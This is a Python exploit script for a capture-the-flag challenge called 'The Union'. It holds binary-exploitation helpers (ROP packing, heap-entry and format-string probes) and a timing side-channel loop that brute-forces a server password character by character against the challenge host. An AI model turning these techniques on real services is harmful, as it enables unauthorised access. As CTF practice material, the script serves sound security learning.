__author__ = 'HuyNA'
'''

Our biggest competitor the mining corporation, The Union, has a new way of organizing its mining facilities.
On the surface, it looks like a mining location archive. But our man inside told us, it has a secret trapdoor
that we can use to infiltrate the corporation and steal their secret. We need their secret.
They have one success after another and it will not be long until we are finished.
Our informant also told us that not everything is what it seems to be. We do not know what this means.
Luckily for us, he managed to get us the blueprints of the system. So we should be able to study them before we went for the heist.
So, this is your job. Study the blueprints and then go for the valuable 'secret.txt'. This is everything we need to overcome them.
Download: https://wildwildweb.fluxfingers.net/static/chals/theunion_9edfcf7b247775ab57da993863bfaabd

 nc wildwildweb.fluxfingers.net 1423

'''


import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
import sys

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0x99)
    return decode_string

def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop
'''
nc wildwildweb.fluxfingers.net 1423
Note: Read the file "flag". A file that you're allowed to access is "#hello", protected with the password "passw0rd".
 socat TCP-LISTEN:1413,reuseaddr,fork EXEC:./callgate
'''
#s = socket.create_connection(('grandprix.whitehat.vn', 7007))
#s = socket.create_connection(('192.168.248.129', 1423))
s = socket.create_connection(('wildwildweb.fluxfingers.net', 1423))


def decrypt_unions_slogan():
    key_decode = '%,(!x4!%<.>'
    decode_buffer =''
    for i in xrange(len(key_decode)):
        a = (ord(key_decode[i]) ^ (i+66)) & 0xFF
        decode_buffer += chr(a)
    return decode_buffer

# gold>silver
first_part =  decrypt_unions_slogan()

first_part = 'gold>silve'
print recv_until(s, 'Please give the unions slogan and secret word:')
for i in range(0x20,0x7f):
    time.sleep(0.001)
    t = chr(i)
    sent = first_part+t
    print sent
    t1 = time.time()
    s.send(sent+'\n')
    recv_until(s, 'Wrong slogan.')
    t0 = time.time()
    data1 = recv_until(s, 'Please give the unions slogan and secret word:')
    print 'time = '+str(t0-t1)
    print data1
    print '================================'